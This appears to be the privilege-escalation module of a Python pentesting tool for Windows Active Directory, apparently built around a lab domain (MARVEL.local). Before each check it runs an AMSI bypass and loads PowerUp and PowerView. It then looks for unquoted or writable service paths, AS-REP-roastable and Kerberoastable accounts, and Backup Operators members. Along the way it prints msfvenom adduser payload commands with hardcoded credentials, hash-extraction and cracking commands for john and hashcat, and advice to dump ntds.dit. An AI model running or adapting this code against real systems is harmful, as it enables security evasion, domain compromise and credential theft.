from lib.config import *
import time,os,sys


#Starting with the hacking 
def stepFOUR_PrivilegeEsc():
    print(f"\n{ok} 4-Starting with elevate privileges to local administrator...\n")
    print(f"{warning} A- Check Unquoted path services vulnerabilities...")
    checking=0
    while(checking==0):
        time.sleep(2)
        print(f"{ok} Bypassing AMSI Security...\n")
        bypass=configurazione()
        command0=bypass + "; " + f"Import-Module {data}PowerUp.ps1" + "; "
        command1=command0 + " Get-UnquotedService | select Path,ServiceName"
        try:
            value=powershell_commandLine(command1)
            value=cleanstring(value)
            value=value.split("\n")
            if(len(value) == 1):
                print(f"{error} No service unquoted FOUND")
                checking=1
            else:
                print(f"{ok} Service unquoted FOUND\n")
                time.sleep(2)
                print(f"{ok} How can you exploit this vuln...\n")
                print(f"{ok} A-Create with msfvenom a payload to add new user")
                print(f"{ok} B-msfvenom -p windows/adduser USER=fregato PASS=Orologio96@ -f exe > vulnservice.exe")
                print(f"{ok} C-Put the malicious file inside the first dir of the vulnerable service path")
                print(f"{ok} D-Rename with the name of that dir and reload the machine")
                x=input(f"{ok} When you finished press ENTER..\n")
                checking=2
        except Exception as e:
            print(f"{error} No service unquoted FOUND")
            checking=1
    
    time.sleep(1)
    print(f"\n{warning} B- Check Writeable Service Executable...")
    time.sleep(1)
    print(f"{ok} Bypassing AMSI Security...\n")
    bypass=configurazione()
    command0=bypass + "; " + f"Import-Module {data}PowerUp.ps1" + "; "
    command1=command0 + " Get-ModifiableServiceFile"
    try:
        value=powershell_commandLine(command1)
        value=cleanstring(value)
        print(value)
        value=value.split("\n")
        if(len(value) == 1):
            print(f"{error} No Writeable service executable FOUND")
        else:
            print(f"{ok} Writeable service executable FOUND\n")
            time.sleep(2)
            print(f"{ok} How can you exploit this vuln...\n")
            print(f"{ok} A-Create with msfvenom a payload to add new user")
            print(f"{ok} B-msfvenom -p windows/adduser USER=fregato PASS=Orologio96@ -f exe > vulnservice.exe")
            print(f"{ok} C-Put the malicious payload inside the dir of the vulnerable service changing the name of the service with the victim's name")
            print(f"{ok} D-Rename with the name of that dir and reload the machine")
            x=input(f"{ok} When you finished press ENTER..\n")
    except Exception as e:
        print(f"{error} No Writeable service executable FOUND")
    
    time.sleep(1)
    print(f"\n{warning} C- Check AS-REP Roasting on the domains...")
    time.sleep(1)
    print(f"{ok} Bypassing AMSI Security...\n")
    bypass=configurazione()
    command0=bypass + "; " + f"Import-Module {data}PowerView.ps1" + "; "
    command1=command0 + 'Get-DomainUser -PreauthNotRequired | select displayname,userprincipalname,useraccountcontrol '
    try:
        value=powershell_commandLine(command1)
        value=cleanstring(value)
        print(value)
        value=value.split("\n")
        if(len(value) == 1):
            print(f"{error} No users with preauthnotrequired FOUND\n")
            print(f"{ok} 1- GETNPUsers MARVEL.local/jsmith -dc-ip=192.168.73.137 ")
            print(f"{ok} 2- Save the password in a file called tgt")
            print(f"{ok} 3- Use John or whatever bruteforce tool to crack password offline: sudo john tgt --wordlist=rockyou")
        else:
            print(f"\n{ok} Users with preauthnotrequired FOUND\n")
    except Exception as e:
        print(f"{error} General Error: {e}")

    time.sleep(1)
    
    print(f"\n{warning} D- Check abuse Kerberoasting...")
    time.sleep(1)
    print(f"{ok} Bypassing AMSI Security...\n")
    bypass=configurazione()
    command0=bypass + "; " + f"Import-Module {data}PowerView.ps1" + "; "
    command1=command0 + 'Get-NetUser -SPN | select serviceprincipalname '
    try:
        value=powershell_commandLine(command1)
        value=cleanstring(value)
        print(value)
        value=value.split("\n")
        if(len(value) == 1):
            print(f"{error} No Service Account  FOUND\n")
            
        else:
            print(f"\n{ok} Service Account FOUND\n")
            print(f"{ok} 1- GETUserSPN -dc-ip 192.168.73.137 MARVEL.local/(account in the domain) -request ")
            print(f"{ok} 2- Save the TGS encrypted in a file like hash.txt")
            print(f"{ok} 3- hashcat -m 13100 -a 0 hash.txt password --force")
            print("\n+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n")
            bypass=configurazione()
            command0=bypass + "; " + f"Import-Module {data}PowerView.ps1" + "; "
            command1=command0 + 'Get-DomainUser -SPN | Get-DomainSPNTicket -OutputFormat Hashcat '
            try:
                value=powershell_commandLine(command1)
                value=cleanstring(value)
                print(value)
                value=value.split("\n")
                if(len(value) == 1):
                    print(f"\n{error} No Hashcat TGS FOUND\n")
                else:
                    print(f"\n{ok} Hashcat TGS FOUND\n")
            except Exception as e:
                print(f"{error} General Error: {e}")
    except Exception as e:
        print(f"{error} General Error: {e}")

    time.sleep(1)

    print(f"\n{warning} E- Check SeBackupPrivilege to Windows PrivEsc...")
    time.sleep(1)
    print(f"{ok} Bypassing AMSI Security...\n")
    bypass=configurazione()
    command0=bypass + "; " + f"Import-Module {data}PowerView.ps1" + "; "
    command1=command0 + 'Get-NetGroupMember -Name "Backup Operators"'
    try:
        value=powershell_commandLine(command1)
        value=cleanstring(value)
        print(value)
        value=value.split("\n")
        if(len(value) == 1):
            print(f"\n{error} No users in Backup Operators FOUND\n")
        else:
            print(f"\n{ok} User in Backup Operators FOUND\n")
            time.sleep(2)
            command0=bypass + "; " + f"Import-Module {data}PowerView.ps1" + "; "
            command1=command0 + 'Get-NetGroupMember -Name "Remote Management Users"'
            value=powershell_commandLine(command1)
            value=cleanstring(value)
            print(value)
            value=value.split("\n")
            if(len(value) == 1):
                print(f"\n{error} No users in Remote Management Users FOUND\n")
            else:
                print(f"\n{ok} User in Remote Management Users FOUND\n")
                print(f"{ok} You can exploit the vulnerability of SeBackupPrivilege to dump ntds.dit and system to get hash")
    except Exception as e:
        print(f"{error} General Error: {e}")


    
    sys.exit(0)
    print(f"{warning} Check if this domain user has access to a server where a domain admin is logged in...")
    print(f"{ok} Invoke-UserHunter take a few minutes to check all machines...")
    command0=bypass + "; " + f"Import-Module {data}PowerView.ps1" + "; "
    command1=command0 + " Invoke-UserHunter -CheckAccess"
    value=powershell_commandLine(command1)
    value=cleanstring(value)
    value=value.split("\n")
    for item in value:
        if "LocalAdmin" in item:
            if "true" in item:
                print(f"{ok} This current account has local admin access in ")

    
    



if __name__=="__main__":
    title()
    time.sleep(2)
    stepONE_setupPolicy()
    time.sleep(1)
    print("\n============================================================================\n")
    stepTWO_Installing_tools()
    time.sleep(1)
    print("\n============================================================================\n")
    StepTHREE_Enumeration()
    time.sleep(1)
    print("\n============================================================================\n")
    stepFOUR_PrivilegeEsc()
